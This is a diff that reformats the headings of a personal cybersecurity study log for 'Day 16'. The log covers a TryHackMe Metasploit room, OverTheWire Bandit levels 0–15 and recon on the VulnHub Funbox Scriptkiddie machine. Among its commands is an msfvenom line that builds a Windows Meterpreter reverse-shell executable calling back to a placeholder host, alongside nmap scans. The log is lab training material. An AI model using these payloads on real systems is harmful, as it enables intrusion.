@@ -1,5 +1,5 @@
-###🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie
-##📌 Overview
+### 🚀 Day 16: Metasploit | Bandit (0–15) | VulnHub Scriptkiddie
+## 📌 Overview
 
 Day 16 was a packed day of learning and practice across three platforms:
 
@@ -9,7 +9,7 @@ OverTheWire Bandit (levels 0 → 15) — Strengthened Linux fundamentals through
 
 VulnHub: Funbox Scriptkiddie — Beginner-friendly CTF-style machine, performed initial recon and setup.
 
-##🔹 TryHackMe — Metasploit Room
+## 🔹 TryHackMe — Metasploit Room
 Key Topics
 
 Scanning targets with Metasploit
@@ -24,7 +24,8 @@ Generating payloads with msfvenom
 
 Obtaining a Meterpreter session
 
-Important Commands
+## Important Commands
+
 # Start and initialize the Metasploit database
 msfdb init
 
@@ -54,7 +55,7 @@ run
 # Generate payload with msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > shell.exe
 
-🔹 OverTheWire — Bandit (Level 0 → 15)
+## 🔹 OverTheWire — Bandit (Level 0 → 15)
 Focus Areas
 
 SSH basics
@@ -69,7 +70,8 @@ Cron jobs
 
 Password retrieval logic
 
-Important Commands
+## Important Commands
+
 # SSH into Bandit
 ssh bandit0@bandit.labs.overthewire.org -p 2220
 
@@ -97,7 +99,7 @@ find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
 # Connect via nc
 nc <host> <port>
 
-##🔹 VulnHub — Funbox: Scriptkiddie
+## 🔹 VulnHub — Funbox: Scriptkiddie
 Setup
 
 Downloaded & imported Funbox11.ova
@@ -109,7 +111,7 @@ funbox11  <target_ip>
 
 Works better with VirtualBox
 
-Initial Recon
+## Initial Recon
 # Host discovery
 nmap -sn <target_network>/24
 
@@ -122,7 +124,7 @@ nmap -sV -sC -p <ports> <target_ip>
 # Add entry for convenience
 echo "<target_ip> funbox11" | sudo tee -a /etc/hosts
 
-##🔑 Key Takeaways
+## 🔑 Key Takeaways
 
 Metasploit is more than just an exploitation tool — its database & msfvenom features make it a full pentest framework.
 
@@ -130,7 +132,7 @@ Bandit reinforces Linux fundamentals that are critical in real-world scenarios.
 
 VulnHub challenges simulate attacker workflows and build applied experience.
 
-##🛡️ High-Level Mitigations
+## 🛡️ High-Level Mitigations
 
 Keep systems patched (avoid unpatched services like MS08-067 / MS17-010).
 
